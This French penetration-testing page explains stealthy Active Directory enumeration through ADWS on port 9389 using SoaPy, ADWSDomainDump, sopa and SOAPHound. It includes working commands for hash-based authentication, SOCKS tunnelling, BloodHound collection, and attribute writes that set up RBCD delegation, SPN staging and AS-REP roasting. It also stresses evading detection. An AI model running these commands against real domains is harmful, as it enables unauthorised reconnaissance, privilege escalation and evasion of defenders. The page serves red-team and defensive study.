# Énumération d’Active Directory Web Services (ADWS) et collecte furtive

{{#include ../../banners/hacktricks-training.md}}

## Qu’est-ce qu’ADWS ?

Active Directory Web Services (ADWS) est **activé par défaut sur chaque contrôleur de domaine depuis Windows Server 2008 R2** et écoute sur le port TCP **9389**. Malgré son nom, **aucun HTTP n’est utilisé**. À la place, le service expose des données de type LDAP via une pile de protocoles de framing .NET propriétaires :<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

Comme le trafic est encapsulé dans ces trames SOAP binaires et transite par un port inhabituel, **l’énumération via ADWS a beaucoup moins de chances d’être inspectée, filtrée ou détectée par signature que le trafic LDAP/389 et 636 classique**. Pour les opérateurs, cela signifie :<sup>[[1]](#references)[[7]](#references)</sup>

* Recon plus furtif – les équipes Blue se concentrent souvent sur les requêtes LDAP.
* Liberté de collecter des données depuis des hôtes **non Windows (Linux, macOS)** en faisant transiter le port 9389/TCP via un proxy SOCKS.
* Les mêmes données que celles obtenues via LDAP (utilisateurs, groupes, ACL, schéma, etc.) et la possibilité d’effectuer des **écritures** (par exemple, `msDs-AllowedToActOnBehalfOfOtherIdentity` pour **RBCD**).

Les interactions ADWS sont implémentées via WS-Enumeration : chaque requête commence par un message `Enumerate` qui définit le filtre/les attributs LDAP et renvoie un GUID `EnumerationContext`, puis un ou plusieurs messages `Pull` qui transmettent des résultats jusqu’à la limite définie par le serveur.<sup>[[7]](#references)</sup> Les contextes expirent au bout d’environ 30 minutes ; les outils doivent donc soit paginer les résultats, soit diviser les filtres (requêtes par préfixe pour chaque CN) afin d’éviter de perdre l’état.<sup>[[8]](#references)</sup> Lors de la demande de descripteurs de sécurité, spécifiez le contrôle `LDAP_SERVER_SD_FLAGS_OID` pour omettre les SACL ; sinon, ADWS supprime simplement l’attribut `nTSecurityDescriptor` de sa réponse SOAP.

> NOTE : ADWS est également utilisé par de nombreux outils RSAT avec interface graphique/PowerShell ; le trafic peut donc se confondre avec une activité d’administration légitime.

## SoaPy – Client Python natif

[SoaPy](https://github.com/logangoins/soapy) est une **réimplémentation complète de la pile de protocoles ADWS en Python pur**. Il construit les trames NBFX/NBFSE/NNS/NMF octet par octet, ce qui permet de collecter des données depuis des systèmes de type Unix sans utiliser le runtime .NET.<sup>[[1]](#references)[[2]](#references)</sup>

### Fonctionnalités principales

* Prend en charge le **passage par un proxy SOCKS** (utile depuis des implants C2).
* Filtres de recherche précis, identiques à LDAP : `-q '(objectClass=user)'`.
* Opérations d’**écriture** facultatives (`--set` / `--delete`).
* **Mode de sortie BOFHound** pour une ingestion directe dans BloodHound.<sup>[[3]](#references)</sup>
* Option `--parse` pour rendre les horodatages et `userAccountControl` plus lisibles lorsqu’une lecture humaine est nécessaire.<sup>[[2]](#references)</sup>

### Options de collecte ciblée et opérations d’écriture

SoaPy propose des options prédéfinies qui reproduisent les tâches de recherche LDAP les plus courantes via ADWS : `--users`, `--computers`, `--groups`, `--spns`, `--asreproastable`, `--admins`, `--constrained`, `--unconstrained`, `--rbcds`, ainsi que les paramètres bruts `--query` / `--filter` pour les collectes personnalisées. Combinez-les avec des primitives d’écriture telles que `--rbcd <source>` (définit `msDs-AllowedToActOnBehalfOfOtherIdentity`), `--spn <service/cn>` (préparation de SPN pour un Kerberoasting ciblé) et `--asrep` (active `DONT_REQ_PREAUTH` dans `userAccountControl`).<sup>[[2]](#references)</sup>

Exemple de recherche ciblée de SPN qui ne renvoie que `samAccountName` et `servicePrincipalName` :

```bash
soapy corp.local/alice:'Winter2025!'@dc01.corp.local \
      --spns -f samAccountName,servicePrincipalName --parse
```

Utilisez le même hôte et les mêmes identifiants pour exploiter immédiatement les résultats : récupérez les objets compatibles avec RBCD avec `--rbcds`, puis appliquez `--rbcd 'WEBSRV01$' --account 'FILE01$'` pour préparer une chaîne de Resource-Based Constrained Delegation (voir [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md) pour la procédure complète d’exploitation).

### Installation (hôte opérateur)

```bash
python3 -m pip install soapy-adws   # or git clone && pip install -r requirements.txt
```

## ADWSDomainDump – LDAPDomainDump via ADWS (Linux/Windows)

* Fork de `ldapdomaindump` qui remplace les requêtes LDAP par des appels ADWS sur TCP/9389 afin de réduire les détections de signatures LDAP.
* Effectue une vérification initiale de l’accessibilité du port 9389, sauf si `--force` est spécifié (ignore la sonde si les scans de ports sont bruyants ou filtrés).
* Testé avec Microsoft Defender for Endpoint et CrowdStrike Falcon, avec un contournement réussi documenté dans le README.<sup>[[4]](#references)</sup>

### Installation

```bash
pipx install .
```

### Utilisation

```bash
adwsdomaindump -u 'thewoods.local\mathijs.verschuuren' -p 'password' -n 10.10.10.1 dc01.thewoods.local
```

Une sortie typique consigne la vérification de l’accessibilité du port 9389, le bind ADWS et le début/la fin du dump :

```text
[*] Connecting to ADWS host...
[+] ADWS port 9389 is reachable
[*] Binding to ADWS host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```

## Sopa - Un client pratique pour ADWS en Golang

Comme soapy, [sopa](https://github.com/Macmod/sopa) implémente la pile de protocoles ADWS (MS-NNS + MC-NMF + SOAP) en Golang et expose des options de ligne de commande permettant d’effectuer des appels ADWS tels que :<sup>[[5]](#references)</sup>

* **Recherche et récupération d’objets** - `query` / `get`
* **Cycle de vie des objets** - `create [user|computer|group|ou|container|custom]` et `delete`
* **Modification des attributs** - `attr [add|replace|delete]`
* **Gestion des comptes** - `set-password` / `change-password`
* et d’autres commandes, comme `groups`, `members`, `optfeature`, `info [version|domain|forest|dcs]`, etc.

### Points clés du mappage des protocoles

* Les recherches de type LDAP sont effectuées via **WS-Enumeration** (`Enumerate` + `Pull`), avec projection des attributs, contrôle de la portée (Base/OneLevel/Subtree) et pagination.
* La récupération d’un objet unique utilise **WS-Transfer** `Get` ; les modifications d’attributs utilisent `Put` ; les suppressions utilisent `Delete`.
* La création d’objets intégrée utilise **WS-Transfer ResourceFactory** ; les objets personnalisés utilisent une **IMDA AddRequest** basée sur des modèles YAML.
* Les opérations sur les mots de passe sont des actions **MS-ADCAP** (`SetPassword`, `ChangePassword`).<sup>[[5]](#references)</sup>

### Découverte de métadonnées sans authentification (mex)

ADWS expose WS-MetadataExchange sans identifiants, ce qui permet de vérifier rapidement si le service est exposé avant de s’authentifier :<sup>[[5]](#references)</sup>

```bash
sopa mex --dc <DC>
```

### Notes sur la découverte DNS/DC et le ciblage Kerberos

Sopa peut résoudre les DC via SRV si `--dc` est omis et que `--domain` est fourni. Il interroge dans cet ordre et utilise la cible ayant la priorité la plus élevée :<sup>[[5]](#references)</sup>

```text
_ldap._tcp.<domain>
_kerberos._tcp.<domain>
```

Sur le plan opérationnel, privilégiez un résolveur contrôlé par un DC pour éviter les échecs dans les environnements segmentés :

* Utilisez `--dns <DC-IP>` pour que **toutes** les recherches SRV/PTR/forward passent par le DNS du DC.
* Utilisez `--dns-tcp` lorsque UDP est bloqué ou que les réponses SRV sont volumineuses.
* Si Kerberos est activé et que `--dc` correspond à une adresse IP, sopa effectue une **recherche PTR inverse** pour obtenir un FQDN et cibler correctement le SPN/KDC. Si Kerberos n’est pas utilisé, aucune recherche PTR n’a lieu.

Exemple (IP + Kerberos, DNS forcé via le DC) :

```bash
sopa info version --dc 192.168.1.10 --dns 192.168.1.10 -k --domain corp.local -u user -p pass
```

### Options de matériel d’authentification

En plus des mots de passe en clair, sopa prend en charge les **hashes NT**, les **clés AES Kerberos**, le **ccache** et les **certificats PKINIT** (PFX ou PEM) pour l’authentification ADWS. Kerberos est utilisé implicitement avec `--aes-key`, `-c` (ccache) ou les options basées sur des certificats.<sup>[[5]](#references)</sup>

```bash
# NT hash
sopa --dc <DC> -d <DOMAIN> -u <USER> -H <NT_HASH> query --filter '(objectClass=user)'

# Kerberos ccache
sopa --dc <DC> -d <DOMAIN> -u <USER> -c <CCACHE> info domain
```

### Création d’objets personnalisés via des modèles

Pour les classes d’objets arbitraires, la commande `create custom` utilise un modèle YAML qui correspond à une `AddRequest` IMDA :<sup>[[5]](#references)</sup>

* `parentDN` et `rdn` définissent le conteneur et le DN relatif.
* `attributes[].name` accepte `cn` ou `addata:cn` avec espace de noms.
* `attributes[].type` accepte `string|int|bool|base64|hex` ou un `xsd:*` explicite.
* N’incluez **pas** `ad:relativeDistinguishedName` ni `ad:container-hierarchy-parent` ; sopa les injecte.
* Les valeurs `hex` sont converties en `xsd:base64Binary` ; utilisez `value: ""` pour définir des chaînes vides.

## SOAPHound – Collecte ADWS à haut volume (Windows)

[FalconForce SOAPHound](https://github.com/FalconForceTeam/SOAPHound) est un collecteur .NET qui effectue toutes les interactions LDAP via ADWS et génère du JSON compatible avec BloodHound v4. Il crée un cache complet de `objectSid`, `objectGUID`, `distinguishedName` et `objectClass` une seule fois (`--buildcache`), puis le réutilise pour les passes à haut volume `--bhdump`, `--certdump` (ADCS) ou `--dnsdump` (DNS intégré à AD), de sorte que seuls ~35 attributs critiques quittent le DC. AutoSplit (`--autosplit --threshold <N>`) répartit automatiquement les requêtes par préfixe CN afin de respecter le délai d’expiration de 30 minutes d’EnumerationContext dans les grandes forêts.<sup>[[8]](#references)</sup>

Workflow typique sur une VM opérateur jointe au domaine :

```powershell
# Build cache (JSON map of every object SID/GUID)
SOAPHound.exe --buildcache -c C:\temp\corp-cache.json

# BloodHound collection in autosplit mode, skipping LAPS noise
SOAPHound.exe -c C:\temp\corp-cache.json --bhdump \
              --autosplit --threshold 1200 --nolaps \
              -o C:\temp\BH-output

# ADCS & DNS enrichment for ESC chains
SOAPHound.exe -c C:\temp\corp-cache.json --certdump -o C:\temp\BH-output
SOAPHound.exe --dnsdump -o C:\temp\dns-snapshot
```

Les JSON exportés s’intègrent directement aux workflows SharpHound/BloodHound — consultez la [méthodologie BloodHound](bloodhound.md) pour des idées de représentation graphique en aval. AutoSplit rend SOAPHound résilient dans les forêts comptant plusieurs millions d’objets, tout en réduisant le nombre de requêtes par rapport aux snapshots de type ADExplorer.

## Workflow de collecte AD furtive

Le workflow suivant montre comment énumérer les **objets de domaine et ADCS** via ADWS, les convertir en JSON BloodHound et rechercher des chemins d’attaque basés sur des certificats — le tout depuis Linux :

1. **Tunnélisez le port 9389/TCP** du réseau cible vers votre machine (par exemple avec Chisel, Meterpreter, un port-forward dynamique SSH, etc.). Exportez `export HTTPS_PROXY=socks5://127.0.0.1:1080` ou utilisez `--proxyHost/--proxyPort` de SoaPy.

2. **Collectez l’objet du domaine racine :**

```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
      -q '(objectClass=domain)' \
      | tee data/domain.log
```

3. **Collecter les objets liés à ADCS à partir du NC Configuration :**

```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
      -dn 'CN=Configuration,DC=ludus,DC=domain' \
      -q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority) \\
           (objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
      | tee data/adcs.log
```

4. **Convertir vers BloodHound :**

```bash
bofhound -i data --zip   # produces BloodHound.zip
```

5. **Importez le ZIP** dans l’interface graphique de BloodHound et exécutez des requêtes cypher telles que `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c` pour révéler les chemins d’escalade de privilèges via les certificats (ESC1, ESC8, etc.).

### Écriture de `msDs-AllowedToActOnBehalfOfOtherIdentity` (RBCD)

```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
      --set 'CN=Victim,OU=Servers,DC=ludus,DC=domain' \
      msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
```

Combinez cela avec `s4u2proxy`/`Rubeus /getticket` pour une chaîne complète de **Resource-Based Constrained Delegation** (voir [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md)).

## Résumé des outils

| Objectif | Outil | Notes |
|---------|------|-------|
| Énumération ADWS | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, lecture/écriture |
| Dump ADWS à grand volume | [SOAPHound](https://github.com/FalconForceTeam/SOAPHound) | .NET, cache-first, modes BH/ADCS/DNS |
| Import dans BloodHound | [BOFHound](https://github.com/bohops/BOFHound) | Convertit les logs SoaPy/ldapsearch |
| Compromission de certificats | [Certipy](https://github.com/ly4k/Certipy) | Peut être routé via le même SOCKS |
| Énumération ADWS et modifications d’objets | [sopa](https://github.com/Macmod/sopa) | Client générique permettant d’interagir avec les endpoints ADWS connus : énumération, création d’objets, modification d’attributs et changement de mots de passe |

## References

- [1] [SpecterOps – Veillez à utiliser SOAP(y) – Guide de l’opérateur pour une collecte AD furtive via ADWS](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
- [2] [SoaPy sur GitHub](https://github.com/logangoins/soapy)
- [3] [BOFHound sur GitHub](https://github.com/bohops/BOFHound)
- [4] [ADWSDomainDump sur GitHub](https://github.com/mverschu/adwsdomaindump)
- [5] [Sopa sur GitHub](https://github.com/Macmod/sopa)
- [6] [Microsoft – Spécifications MC-NBFX, MC-NBFSE, MS-NNS et MC-NMF](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)
- [7] [IBM X-Force Red – Énumération furtive des environnements Active Directory via ADWS](https://logan-goins.com/2025-02-21-stealthy-enum-adws/)
- [8] [FalconForce – Outil SOAPHound pour collecter des données Active Directory via ADWS](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/)
{{#include ../../banners/hacktricks-training.md}}
